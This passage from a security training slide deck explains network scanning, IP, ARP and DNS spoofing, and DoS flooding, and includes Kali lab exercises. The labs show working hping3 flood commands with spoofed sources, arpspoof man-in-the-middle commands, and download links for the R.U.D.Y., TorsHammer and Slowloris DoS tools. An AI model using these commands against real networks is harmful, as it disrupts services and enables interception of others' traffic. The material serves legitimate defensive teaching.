traceroute and tracert
By monitoring the target's network, you can check for things like the presence of firewalls.
Network scanning
DNS queriesDetermine the scope of
your activity
Collect a list of
networks
Network
reconnaissance

## Page 76

7676
Saving scan results
⚫ Scan type
- ping & ICMP Scan
• ping checks if the network and systems are working properly
• Method to use echo request and echo reply
• Use Internet Control Messaging Protocol (ICMP)
⚫ Open scan
- Extract open port information based on a normal connection using a traditional TCP 3-way
handshake
- Scan TCP connection
• For open ports, the target system responds with a SYN/ACK packet.
• For closed ports, the target system responds with an RST/ACK packet.
There are two types of scans : ping & ICMP scans and scans using TCP and UDP. Among them,
scans using TCP and UDP include open scans and half-open scans.
Network scanning

## Page 77

7777
Saving scan results
⚫ Half-open scan
- How to abnormally terminate a TCP 3-way handshake method connection
• Avoid being written to target system logs, but detected by firewalls or IDSes
• TCP half-open scan
▪ Consider the target host as alive if a SYN/ACK response is received from the target after
sending a SYN
▪ Send an RST instead of an ACK from the source to the destination, which does not
establish a session and leaves no logs.
⚫ Stealth scan
- A scan that determines whether a port on the target system is active without fully
establishing a session.
- Leave no logs associated with connecting to a system session
- Presence of ACK, null, Xmas scans, etc.
There are two types of scans : ping & ICMP scans and scans using TCP and UDP. Among them,
scans using TCP and UDP include open scans and half-open scans.
Network scanning

## Page 78

7878
Saving scan results
⚫ Stealth scan
- X-mas scan
• Scan that sends all flags or sends FIN, PSH, and URG flags
- ACK or FIN scan
• Scan that only sends ACK or FIN flags
- Null scan
• Scan that doesn't send any flags
⚫ UDP scan
- When a UDP packet is sent to the destination host, a closed port responds with
ICMP_PORT_UNREACH.
- Open ports use the no-response method
There are two types of scans : ping & ICMP scans and scans using TCP and UDP. Among them,
scans using TCP and UDP include open scans and half-open scans.
Network scanning

## Page 79

7979
Saving scan results
⚫ TCP scan
- TCP open scan
- TCP half-open scan
During an open scan, TCP sends SYN+ACK for open ports and RST+ACK for closed ports. In a half-
open TCP scan, if the port is open, it sends RST to disconnect.
Network scanning
TCP Open Scan (when the port is open)
SYN
SYN + ACK
ACK
Attacker Victim Attacker Victim
TCP Open Scan (when the port is closed)
SYN
RST + ACK
TCP Half Scan (when the port is open)
SYN
SYN + ACK
RST
Attacker Victim Attacker Victim
TCP Half Scan (when the port is closed)
SYN
RST + ACK

## Page 80

8080
Saving scan results
⚫ Scan
- UDP scan
- FIN, X-MAS, and Null Scan
When scanning for FIN, Xmas, or null, no response is returned if the port is open. When scanning
via UDP, no response is given if the port is open, and an ICMP unreachable packet is sent if the
port is closed.
Network scanning
UDP Scan (when the port is open)
UDP Packet
Attacker Victim Attacker Victim
UDP Scan (when the port is closed)
UDP Packet
ICMP Unreachable Packet
FIN, Xmas, Null Scan (when the port is open)
Attacker Victim Attacker Victim
FIN, Xmas, Null Scan (when the port is closed)
FIN, NULL, and Xmas scans
RST + ACK
No response
FIN, NULL, and Xmas packets
No response

## Page 81

8181
Saving scan results
⚫ Banner grabbing
- Check the operating system version and kernel version
• Also on port 21, 23, 25, 110, 143
The information displayed when logging onto a remote system, such as Telnet, is known as a
banner. It shows the version of the application and other relevant details. This enables you to
gather information.
Lab exercise for network scanning
< Banner grabbing for web servers>
< Banner Graphing to SMTP
Server >.
< Banner grabbing for DB(Mysql) servers>

## Page 82

8282
Saving scan results
⚫ Lab environment
- Kali Linux
⚫ SYN scan
- Use the hping3 command, type the command as shown below.
• -c : number of packets to send / -p : port / -S : SYN packet flag
Sometimes homepages like Naver block ICMP packets for security reasons. To verify that the
server is up and running in these cases, you can scan for ports with active services to see if the
server is present and running. Below are the results of the HTTP port scan.
Lab exercise for network scanning

## Page 83

8383
Saving scan results
⚫ SYN scan
- Check the scan results with Wireshark
• The reason RST packets are sent : to force the server you're trying to connect to to
terminate the session with a 3-way handshake, leaving no trace of the connection.
Sometimes homepages like Naver block ICMP packets for security reasons. To verify that the
server is up and running in these cases, you can scan for ports with active services to see if the
server is present and running. Below are the results of the HTTP port scan.
Scanning with HPP3

## Page 84

8484
Saving scan results
⚫ Lab environment
- Kali Linux
- Linux-based server with Telnet enabled
⚫ SYN scan
- Run the commands on Kali Linux as shown below.
Increment each port number by one to see which ports are being probed by the hping3
commands.
Lab exercise for network scanning

## Page 85

8585
Saving scan results
⚫ SYN scan
- Check the scan results with Wireshark
Increment each port number by one to see which ports are being probed by the hping3
commands.
Lab exercise for network scanning

## Page 86

8686
Saving scan results
⚫ UDP scan
In addition, you can check what services exist by scanning through hping3.
Lab exercise for network scanning

## Page 87

8787
Saving scan results
⚫ ICMP scan
In addition, you can check what services exist by scanning through hping3.
Lab exercise for network scanning

## Page 88

Spoofing
03
• Spoofing overview
• IP spoofing
• ARP spoofing
• DNS spoofing

## Page 89

8989
Spoofing overview
⚫ What is spoofing?
- A technique in which an attacker disguises and alters data on a network, website, etc. to
make it appear to be a legitimate system.
- Hacking techniques, such as tricking users into unintentionally accessing certain systems.
- Used for phishing techniques, such as spoofing emails, websites, etc. to steal users'
passwords, credit card information, etc.; and used to deliver malware malware
⚫ Spoof types
- ARP spoofing
- IP spoofing
- DNS spoofing
The dictionary definition of spoofing is "to deceive.” In a network, the target of spoofing can be
anything related to network communication, such as MAC addresses, IP addresses, etc. Spoofing
refers to attacks that utilize deception.
Spoofing overview

## Page 90

9090
IP spoofing
⚫ What is IP spoofing?
- The generation of IP packets to hide the identity of the sender and impersonate another
system, or both.
- Often used by attackers to avoid being traced back
to an IP address or to conduct DDoS attacks against
a target
⚫ Attack procedure
- The attackerspoofsthe sourceIP to send SYN packets.
- Serverrespondswith a SYN/ACKto the spoofedIP.
- Client (never sent SYN) terminates the connection
with RST.
IP spoofing is an attack that exploits a vulnerability in the IP itself to falsify the attacker's IP
address. IP spoofing can also be used to perform DoS attacks by breaking the connection
between the target computer and the server.
IP Spoofing
AttackersServer
Client
1
2 3
RSTSYN/ACK
Trust
SYN

## Page 91

9191
IP spoofing
⚫ Attack procedure
- The attacker attempts a TCP SYN flooding attack
against a client.
- The attacker tricks the client's IP into sending
SYN to a server.
- The server sends back SYN/ACK packets.
• The client is unable to connect due to the SYN
flooding attack, and the server's packets are
dropped.
- The attacker sends ACK packets to the server.
• The packets contain IP spoofing commands to
establish a connection while pretending to be
the trusted client.
IP spoofing is an attack that exploits a vulnerability in the IP itself to falsify the attacker's IP
address. IP spoofing can also be used to perform DoS attacks by breaking the connection
between the target computer and the server.
IP spoofing
AttackersServer
Client
1
2
3
SYN/ACK
Trust
TCP SYN
Flooding
4
SYN
ACK Storm

## Page 92

9292
IP spoofing
⚫ How to prevent
- Filter incoming packets that have the internal network IP address as the source IP address.
- You can't prevent attacks from internal users, so use services that require authentication,
such as SSH, on each system.
• Avoid using services that do not require authentication, such as rsh and rlogin.
- IP spoofing is a problem of TCP/IP design and implementation
• No protection is foolproof unless new protocols are introduced.
• Otherwise, ongoing management and inspection is required
IP spoofing is an attack that exploits a vulnerability in the IP itself to falsify the attacker's IP
address. IP spoofing can also be used to perform DoS attacks by breaking the connection
between the target computer and the server.
IP spoofing

## Page 93

9393
ARP spoofing
⚫ What is ARP spoofing ?
- Used as a technique for man-in-the-middle attacks in local area network (LAN) environments
- Attacks by tampering with ARP reply packets that occur during the IP-to-MAC address
translation process.
⚫ How MITM attacks work with ARP spoofing
- A technique in which communication between two terminals is made to appear legitimate,
allowing data to pass through the attacker
- The two devices believe they are communicating normally, but are actually forwarding
packets through an attacker.
- An attacker can sniff or spoof communication between two devices and forward it.
APR spoofing is a common man-in-the-middle attack in local area networks, where an attacker
deceives communication between two terminals into passing through the attacker. This allows
the attacker to sniff or spoof network communications from the middle.
MITM attacks using ARP spoofing

## Page 94

9494
ARP spoofing
⚫ ARP spoofing attack process
- The attacker (IP:x.x.x.40) keeps sending
ARP reply packets with its MAC address
to the IP of User A, who is trying to connect
to User B's PC.
- User B's PC remembers the IP corresponding
to x.x.x.10 as the attacker's MAC address
in its ARP table.
ARP spoofing can be used to perform man-in-the-middle attacks. This attack can be used to
eavesdrop on or manipulate communications.
MITM attacks using ARP spoofing
IP:x.x.x.10 / MAC: AA:AA
IP:x.x.x.20 / MAC: BB:BB IP:x.x.x.30 / MAC: CC:CC
IP:x.x.x.40 / MAC: DD:DD
I'm x.x.x.10
 Attacker
x.x.x.10 is
DD:DD
I remember it…
IP : x.x.x.10 / MAC: DD:DD

## Page 95

9595
ARP spoofing
⚫ ARP spoofing attack process
- The second time the attacker (IP:x.x.x.40) keeps
sending ARP reply packets with its MAC address
to the IP of User B, who is trying to connect
to User A's PC.
- User A's PC remembers the IP corresponding
to x.x.x.10 as the attacker's MAC address
in its ARP table..
ARP spoofing can be used to perform man-in-the-middle attacks. This attack can be used to
eavesdrop on or manipulate communications.
MITM attacks using ARP spoofing
IP:x.x.x.10 / MAC: AA:AA
IP:x.x.x.20 / MAC: BB:BB IP:x.x.x.30 / MAC: CC:CC
IP:x.x.x.40 / MAC: DD:DD
I'm x.x.x.20
 Attackers
x.x.x.20 is
DD:DD
I remember it…
IP : x.x.x.20 / MAC: DD:DD

## Page 96

9696
ARP spoofing
⚫ ARP spoofing attack process
- The PCs of Users A and B, which are trying to
connect to each other, instead communicate
with the MAC address of the attacker.
- Each of User A’s and User B’s PC sees it as
a legitimate connection, so whatever the attacker
does, each is treated as a legitimate packet.
⚫ Threats using ARP spoofing
- Sniffing techniques
• Can look at each other's communications,
as in eavesdropping, intercepting, etc.
- Spoofing techniques
• Man-in-the-middle attacks can modify each
other's packets and forward them to each other.
ARP spoofing can be used to perform man-in-the-middle attacks. This attack can be used to
eavesdrop on or manipulate communications.
MITM attacks using ARP spoofing
IP:x.x.x.10 / MAC: AA:AA
IP:x.x.x.20 / MAC: BB:BB IP:x.x.x.30 / MAC: CC:CC
IP:x.x.x.40 / MAC: DD:DD
Attackers
We are
connected! But, I
watching you.
We are
connected!

## Page 97

9797
ARP spoofing
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : Windows 7
• 32bit/64bit architecture agnostic
• IP : 192.168.0.200
Based on the theory of ARP spoofing attack, we will practice the actual attack.
Lab exercise for ARP spoofing attack

## Page 98

9898
ARP spoofing
⚫ Lab exercise for ARP spoofing attack
- Perform an ARP reply attack on the victim PC's IP and gateway IP as shown below.
• Attack the gateway (stay alive and work in a new window)
• Attack the victim (stay alive and work in a new window).
- Run the command to enable forwarding for network connections (choose one of the two
settings for your convenience).
• Forward IP with fragrouter.
• Forward by changing the forwarding setting value.
Based on the theory of ARP spoofing attack, we will practice the attack.
Lab exercise for ARP spoofing attack
# arpspoof -i eth0 -t 192.168.0.2 192.168.0.200
# arpspoof -i eth0 -t 192.168.0.200 192.168.0.2
# fragrouter -B1
fragrouter: base-1: normal IP forwarding
# echo 1 > /proc/sys/net/ipv4/conf/eth0/forwarding
# cat /etc/sys/net/ipv4/conf/eth0/forwarding
1

## Page 99

9999
ARP spoofing
⚫ Lab exercise for ARP spoofing attack
- Use commands and network test connections to verify the attack from the victim's PC.
Based on the theory of ARP spoofing attack, we will practice the attack.
Lab exercise for ARP spoofing attack
Interface
Internet Address                Physical address          Type
Dynamic
Dynamic
Static
Static
Static

## Page 100

100100
DNS spoofing
⚫ Domain Name System (DNS) servers
- Translate human -readable domain names into IP addresses that are used to route
communications.
- If the server is unaware of the translation of the request, it queries other servers, making
the process recursive.
- If it receives another request for the same translation, it responds until the cache expires.
- If a DNS server receives incorrect translations and caches them to optimize performance, it
is considered poisoned.
• In this case, it will return invalid data to the client.
• Traffic may be redirected to other systems.
DNS spoofing, or DNS cache poisoning, is the process of injecting spoofed Domain Name System
data into a DNS resolver's cache, causing the name server to return invalid result records. The
attack can be redirected to the attacker's computer.
Domain Name System (DNS) overview

## Page 101

101101
DNS spoofing
⚫ Normal DNS query procedure
- The system enters the domain into the browser.
- Query a domain address with a specified DNS server
- The DNS server returns an IP address
response for the queried domain address.
- The system receiving the IP address
requests access to that IP address.
DNS spoofing, or DNS cache poisoning, is the process of injecting spoofed Domain Name System
data into a DNS resolver's cache, causing the name server to return invalid result records. The
attack can be redirected to the attacker's computer.
Domain Name System (DNS) overview
Enter a domain1
2 Query IP addresses to a domain3
IP address
response
123.123.123.123
4
Connect to the IP address that responded
123.123.123.123

## Page 102

102102
DNS spoofing
⚫ Attack procedure
- The attacker performs ARP spoofing on the
client.
- Victim sends a DNS query.
- The attacker responds with its web server IP
address in response to DNS query.
- Victim connects to the attacker's web server.
⚫ How to prevent
- Manage the ARP cache list statically rather
than dynamically
- Enable SSL/TLS communication
- Enforce the DNSSEC protocol
DNS spoofing, or DNS cache poisoning, is the process of injecting spoofed Domain Name System
data into a DNS resolver's cache, causing the name server to return invalid result records. The
attack can be redirected to the attacker's computer.
DNS spoofing
Enter a domain2
1
ARP spoofing/
data sniffing
3 DNS query
4
DNS Server Phising Web Server
Attacker’s web Server IP
response
6 Connect to a
web server5IP address
response
Response
ignored

## Page 103

Flooding
04
• Flooding overview
• SYN flooding
• HTTP flooding
• ICMP flooding

## Page 104

104104
Flooding overview
⚫ DoS
- Short for Denial of Service
- A collective term for a type of attacks that temporarily or indefinitely disrupt a service.
- Overload the system or cause system errors so that some or all legitimate requests do not
work properly
- Typical attack example : Ping of Death attack
⚫ DDoS
- Method by which multiple systems can deny service by exceed ing the bandwidth or
resources of the target system
- Usually corrupt the system by flooding it with traffic
- Availability breach attacks are possible without having system failure.
- DoS and DDoS should be considered as a form of DoS, not an apples-to-apples comparison.
- Typical attack example : SYN flooding attack
DoS and DDoS are sometimes used interchangeably, and it's important to distinguish between
them.
DoS and DDoS misconceptions

## Page 105

105105
Flooding overview
⚫ Types of DoS and DDoS attacks
- Flood attacks
• Packet Per Second (PPS) attacks
▪ UDP flood attack
▪ SYN flood attack
▪ ACK flood attack
▪ SYN/ACK flood attack
▪ FIN/RST/PSH flood attack
• ICMP flood attack
• Application-layer flood attack
• HTTP GET/POST flood attack
• DNS query flood attack
There are several types of DoS attacks, including the following
Types of DoS attacks
 Ping of Death attack
 Slowloris attack
 Teardrop attack
 Telepohony Denial-of-Service (TDoS)
 Smurf attack
 DRDoS
 Cache Control attack
 LAND attack
 ACK storm
 NTP amplification attack
 SSDP reflect DDoS
 WordPress DoS
Source : wikipedia

## Page 106

106106
Flooding overview
⚫ Attack types
Types of DDoS attacks are categorized into Packet Per Second (PPS), bulk traffic, HTTP flooding,
and application, and the main characteristics of each type are summarized below.
Types of DoS attacks
PPS increase
(PPS consuming)
Send large amounts of
traffic
(Bandwidth
consuming)
Web service delays
(HTTP flooding) Application attack
Protocol used TCP Primarily UDP/ICMP HTTP SQL, MAIL, FTP
IP spoofing Spoofed/real IP Spoofed/real IP Real IP Real IP
Attack type
64 bytes or less
100 Mbyte
100 thousands to
millions of PPSes
1,000 to 1,500 bytes
1 Gbyte
100 thousands of PPSes
Attempt to access the
same URL
(Other variations and new
types)
Persistent requests for
spoofed services
(Other variations and
new types)
Attack effect
Network equipment,
security equipment,
Load on servers, etc.
Line bandwidth exceeded Web server load Application
server load
System damage
The attacked system or
all systems on the same
network.
All systems in use on the
same network Target system Target system

## Page 107

107107
Flooding overview
⚫ What is flood attack?
- Flood means "to overflow" or "flood”
- Usually refers to an attack method that attempts to cause an availability breach by flooding
the target with data beyond what it can work with.
⚫ Flood attack types
One of the most common types of DDoS attacks is the flood attack. These are used to overwhelm
the target by flooding it with more data than it can handle.
Types of DoS attacks
- Flag manipulation attacks
• SYN flood attack
• ACK flood attack
• SYN/ACK flood attack
• FIN/RST/PSH flood attack
- Attacks that exploit other network
characteristics
• UDP flood attack
• Application-layer flood attack
• HTTP GET/POST flood attack
• DB query flood attack
• DNS query flood attack
• ICMP flood attack

## Page 108

108108
ICMP flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will learn how ICMP flood attacks work and how to analyze them.
ICMP flood attack

## Page 109

109109
ICMP flooding
⚫ Attack method
- Run on Kali
- Send ICMP packets using the hping3 command
We will learn how ICMP flood attacks work and how to analyze them.
ICMP flood attack
# hping3 --flood --rand-source -1 192.168.0.171
HPING 192.168.0.171 (eth0 192.168.0.171): S set, 40 headers + 0 data bytes
-p [portnumber] : port number
-1: ICMP packet
--flood: flood attack
--rand-source: a random source address

## Page 110

110110
ICMP flooding
⚫ Attack analysis
- Identify network bandwidth spikes caused by flood attacks
We will learn how ICMP flood attacks work and how to analyze them.
ICMP flood attack

## Page 111

111111
ICMP flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will learn how ICMP flood attacks work and how to analyze them.
ICMP flood attack

## Page 112

112112
ICMP flooding
⚫ Attack analysis
- Verify that ICMP request and reply packets are exchanged.
- When the random source option is selected, the source IPs express different value.
We will learn how ICMP flood attacks work and how to analyze them.
ICMP flood attack

## Page 113

113113
SYN flooding
⚫ SYN flood attack
- What is a SYN flood attack?
• One of the classic flood attacks, where many attacks are repeated in a short period of time.
• It exploits a loophole in TCP's 3-way handshake method by sending SYN packets and
making the victim server wait.
- How the attack works
• An attacker sends SYN packets to the target system by spoofing the source address.
• The target system repeatedly processes other responses while waiting for a response
from this spoofed system.
• Ignore legitimate connections because the queue is full of connections allowed
A SYN flood attack is a denial of service attack that exploits the connection-oriented nature of
TCP, a three-way handshake method, to prevent legitimate connections from being made by
exceeding the port's maximum allowed connection queue.
DoS attack types - PPS
Send SYN packets
(Src IP : spoofed address)
Flood
SYN/ACK Packets
wait after sending

## Page 114

114114
SYN flooding
⚫ ACK flood attack
- What is an ACK flood attack?
• A flood attack, in which a large number of attacks are repeated in a short period of time
• An attack that exploits the connection-oriented nature of TCP to cause a target system to
expend resources to process certain packets when they arrive.
- How the attack works
• An attacker sends ACK packets to the target system by spoofing the source address.
• The target system repeatedly processes other responses while waiting for a response
from this spoofed system.
• Ignore legitimate connections because the queue is full of connections allowed
Similar to a SYN flood attack, an ACK flood attack is a denial of service attack that exploits the
connection-oriented nature of the network and makes it impossible to perform normal activities
by consuming resources to process responses.
DoS attack types - PPS
Send an ACK packet
(Src IP : spoofed address)
Flood
RST Packets
wait after sending

## Page 115

115115
SYN flooding
⚫ Other TCP flag (Push-ACK, FIN, RST, URG) flood attacks
- What are TCP flag (Push-ACK, FIN, RST, URG) flood attacks?
• An attack method that is nearly identical to the ACK flood attack method and exploits the
connection-oriented nature of TCP
• Depending on the flag setting, the response will be handled slightly differently, but will
still be denied service by consuming resources in the form of a flood.
- How the attack works
• An attacker sends ACK packets to the target system by spoofing the source address.
• The target system repeatedly processes other responses while waiting for a response
from this spoofed system.
• Ignore legitimate connections because the queue is full of connections allowed
Attacks using other TCP flags are not much different from ACK flood attacks, and the principle is
the same : to consume resources to process responses to requests, preventing normal
connections.
DoS attack types - PPS
Flood
Send ICMP packets

## Page 116

116116
SYN flooding
⚫ Packets Per Second (PPS)
- IP spoofed SYN flooding attack
• Send a large number of SYN packets to the target server after IP spoofing
• The attacked server will have multiple SYN_RECEIVED session states.
• Cause exhaustion of the server's CPU and connection resources
- TCP connection flooding attack (3-way handshaking completed normally)
• Send a large number of SYN packets to the target server without spoofing the IP.
• Attacked server has multiple ESTABLISHED session states
• Cause exhaustion of the server's CPU and connection resources
- TCP out-of-state packet flooding attacks (ACK/SYN + ACK/FIN, etc.)
• Send a large number of ACK/SYN + ACK/FIN/RST and other packets to the target server.
• Some network devices and servers may malfunction, including increased CPU usage.
A Packets Per Second (PPS) attack is an attack that aims to exhaust the server's resources by
sending a large number of packets.
DoS attack types - PPS

## Page 117

117117
SYN flooding
⚫ Summary of flood attacks and responses based on TCP flags
Attacks using other TCP flags are not much different from ACK flood attacks, and the principle is
the same : to consume resources to process responses to requests , preventing normal
connections.
DoS attack types - PPS
Attack name Attacker →
Victim
Victim → Attacker
(Run Iptables X)
Victim → Attacker
(Run Iptables O) Remark
SYN flood attack SYN packets SYN/ACK packets SYN/ACK packets
ACK flood attack ACK packets RST packets RST packets
FIN flood attack FIN packets X Destination unreachable
(ICMP) packets
SYN/ACK flood
attack SYN/ACK packets RST packets Destination unreachable
(ICMP) packets
PSH flood attack PSH packets X Destination unreachable
(ICMP) packets
RST flood attack RST packets X Destination unreachable
(ICMP) packets

## Page 118

118118
SYN flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victims : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will learn how SYN flood attacks work and how to analyze them.
SYN flood attack

## Page 119

119119
SYN flooding
⚫ Attack method
- Run on Kali
- Send SYN packets using the hping3 command
We will learn how SYN flood attacks work and how to analyze them.
SYN flood attack
# hping3 192.168.0.171 -p 80 -S --flood
HPING 192.168.0.171 (eth0 192.168.0.171): S set, 40 headers + 0 data bytes
-a [randomIP]: random IP address of the source to spoof
-p [portnumber] : port number
-S: SYN packets
--flood: flood attack

## Page 120

120120
SYN flooding
⚫ Attack method
- Use netstat on the victim PC to check for large numbers of HTTP response queues
We will learn how SYN flood attacks work and how to analyze them.
SYN flood attack
$ sudo netstat -na | more
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN
tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN
tcp        0      0 192.168.0.171:80            192.168.0.150:21984         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21613         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21609         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21727         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21636         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21550         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21501         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21429         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21545         SYN_RECV
tcp        0      0 192.168.0.171:80            192.168.0.150:21283         SYN_RECV

## Page 121

121121
SYN flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will learn how SYN flood attacks work and how to analyze them.
SYN flood attack

## Page 122

122122
SYN flooding
⚫ Attack method
- Packet analysis
• Observea large number of SYN packetsbeing sent to port 80 from a random source address
We will learn how SYN flood attacks work and how to analyze them.
SYN flood attack

## Page 123

123123
SYN flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will learn how ACK flood attacks work and how to analyze them.
ACK flood attack

## Page 124

124124
SYN flooding
⚫ Attack method
- Run on Kali
- Send ACK packets using the hping3 command
We will learn how ACK flood attacks work and how to analyze them.
ACK flood attack
# hping3 192.168.0.171 -A -p 80 --flood --rand-source
HPING 192.168.0.171 (eth0 192.168.0.171): S set, 40 headers + 0 data bytes
-p [portnumber] : port number
-A: ACK packet
--flood: flood attack
--rand-source: random source address

## Page 125

125125
SYN flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will learn how ACK flood attacks work and how to analyze them.
ACK flood attack

## Page 126

126126
SYN flooding
⚫ Attack method
- Packet analysis
• Send ACK packets to port 80 from a random source address and respond with RST packets
• The following process occurs repeatedly
We will learn how ACK flood attacks work and how to analyze them.
ACK flood attack

## Page 127

127127
SYN flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will learn how FIN flood attacks work and how to analyze them.
FIN flood attack

## Page 128

128128
SYN flooding
⚫ Attack method
- Run on Kali
- Send FIN packets using the hping3 command
We will learn how FIN flood attacks work and how to analyze them.
FIN flood attack
# hping3 192.168.0.171 -F -p 80 --rand-source --flood
HPING 192.168.0.171 (eth0 192.168.0.171): S set, 40 headers + 0 data bytes
-p [portnumber] : port number
-F: FIN packets
--flood: flood attack
--rand-source: random source address

## Page 129

129129
SYN flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will learn how FIN flood attacks work and how to analyze them.
FIN flood attack

## Page 130

130130
SYN flooding
⚫ Attack method
- Packet analysis
• Send a FIN packet to port 80 from a random originating address and respond with an
ICMP packet.
• The following process occurs repeatedly.
We will learn how FIN flood attacks work and how to analyze them.
FIN flood attack

## Page 131

131131
HTTP flooding
⚫ HTTP flood attack
- DDoS attacks are categorized as the 7th-layer attacks using HTTP's POST and GET methods.
- They use attack techniques to connect a large number of HTTP sessions, preventing
legitimate sessions from connecting.
- These methods often involve the use of Trojan Horse malware and are characterized by a
lower level of availability compromise than attacks that deplete bandwidth resources.
- The GET method uses standard static content, such as images, to access
- The POST method is primarily used for attacks that use dynamically generated resources.
- Can bypass defenses that block based on bandwidth
Requests Per Second (PRS) refers to attacks based on the number of requests per second,
usually targeting the application layer, which is Layer 7 in the OSI 7-layer model, such as HTTP.
DoS attack types - RPS
HTTP Response packet
HTTP Method(GET/POST) Request Flood
Response Packets
wait after sending
Source : security.radware.com

## Page 132

132132
HTTP flooding
⚫ HTTP Flood Attack
- What are Slow-Rate Attacks?
• Also known as Low and Slow, identified by traffic that looks normal on the surface but has
a slow speed.
• Common attack tools include Slowloris, Sockstress, and R.U.D.Y. (R-U-Dead-Yet)
• Bypasses equipment that defends against traffic by volume or security equipment that
doesn't see all seven layers of the OSI
HTTP flood attacks are attacks that occur in the OSI Layer 7 region. They are difficult to defend
against because they can bypass other security devices that use bandwidth to block them, and
must be defended with devices such as an IPS that can see Layer 7 content.
DoS attack types - RPS
HTTP Response packet
HTTP Method(GET/POST) Request
Response Packets
wait after sending
Source : security.radware.com

## Page 133

133133
HTTP flooding
⚫ HTTP flood attack
- Attack tools
• R.U.D.Y. (R-U-Dead-Yet)
▪ A classic, slow-running attack tool that is still used in many attacks today.
▪ Characterized by using the POST method , assigning a large ‘content-length', and
persisting the connection by assigning a value to a specific variable in the POST area.
▪ Can add a proxy function
▪ Download URL: https://jaist.dl.sourceforge.net/project/r-u-dead-yet/R-U-Dead-Yet.zip
The R.U.D.Y. attack and its variants are one of the most well-known attack methods. It is an
attack using the HTTP POST method, specifically by manipulating the value of the content-length
attribute.
DoS attack types - RPS

## Page 134

134134
HTTP flooding
⚫ HTTP flood attack
- Attack tools
• TorsHammer
▪ Similar to the R.U.D.Y. (R-U-Dead-Yet) tool
▪ A tool that uses the POST method to extend a content-length and send small increments
of that length to consume resources.
▪ Use a Tor server to use a proxy function
▪ Download URL: https://sourceforge.net/projects/torshammer/files/Torshammer/
Torshammer is a tool that uses a slow-rate attack to assign a large content-length to the POST
method. It then sends a small amount of data equal to the content-length value to keep the
connection alive while maintaining a large number of sessions, causing an availability violation.
DoS attack types - RPS

## Page 135

135135
HTTP flooding
⚫ HTTP flood attack
- Attack tools
• Slowloris
▪ An attack tool developed by Robert Hansen that uses slow-rate attack techniques to
take down a web server from a single computer.
▪ Became known as a tool used to protest the 2009 Iranian presidential election.
▪ HTTP flood-type attacks at Layer 7
▪ Effective attack against Apache 1.X, 2.X versions
▪ Does not affect other services and ports, only the web server
▪ Attacks that keep multiple sessions alive long enough to exceed the number of
connectable sessions and prevent legitimate connections from being made.
− Send incomplete GET or POST headers in HTTP to keep a session connected until a
complete packet arrives.
▪ Download URL: https://github.com/gkbrk/slowloris
Slowloris, an attack that has been in the news since a DDoS attack from Iran in 2009, is an OSI
Layer 7 attack that can bypass security devices that detect and protect a certain amount of
bandwidth.
DoS attack types - RPS

## Page 136

136136
HTTP flooding
⚫ Cache-Control (CC) flood attack
- Attack overview
• Notable attacks include the 2009-03-03 and 2007-07-07 DDoS outbreaks.
• One of the most common attacks targeting HTTP at the highest layer of the OSI 7 layers.
• Manipulate the cache control field in the HTTP GET method
- How attacks work
• Take advantage of the fact that normal, legitimate web clients store data once they
receive in a web cache for faster processing, this attack overloads them with new requests
for data from the web each time
• Attack by changing field values in HTTP to 'no-store or no-cache' and 'must-revalidate'
Cache-Control attacks, which were highlighted in the March 3, 2009 and July 7, 2007 DDoS
outbreaks, modify field values in HTTP to overload it with new response values for each request.
DoS attack types - RPS

## Page 137

137137
HTTP flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : Ubuntu 14.04
• Enable HTTP services
• WordPress
• IP : 192.168.0.140
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 138

138138
HTTP flooding
⚫ Attack method
- Run on Kali
- Download the attack tool from Sourceforge and extract version 2.2 as shown below
• If you don't have a wget link, download RUDY from Sourceforge on your host PC, drag &
drop it to your desktop, and unzip it.
We will explore the RUDY attack method and how to analyze it.
RUDY attack
# mkdir rudy
# cd rudy
# wget https://jaist.dl.sourceforge.net/project/r-u-dead-yet/R-U-Dead-Yet.zip
# unzip R-U-Dead-Yet.zip # unzip
# tar zxf r-u-dead-yet-v2.2.tar.gz
# cd rudy

## Page 139

139139
# firefox & # '&' means run in the background
HTTP flooding
⚫ Attack method
- Launch Firefox or another web browser
• Run them in the order shown on
the right, or type them in a terminal
window as shown below
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 140

140140
HTTP flooding
⚫ Attack method
- Proxy settings
• Click the “Settings” button (       )
in the upper-right corner.
• Click the “Preferences” button (             )
at the bottom.
• Click the “Advanced” icon ( ).
• Click the “Network” tab ( ).
• Click the “Setting” button ( ).
• When the settings window pops up,
click the "OK" button to complete
the settings as shown on the right.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 141

141141
HTTP flooding
⚫ Attack method
- Proxy settings
• Run Burpsuite in a terminal window (also available as Application → Web Application
Analysis → burpsuite).
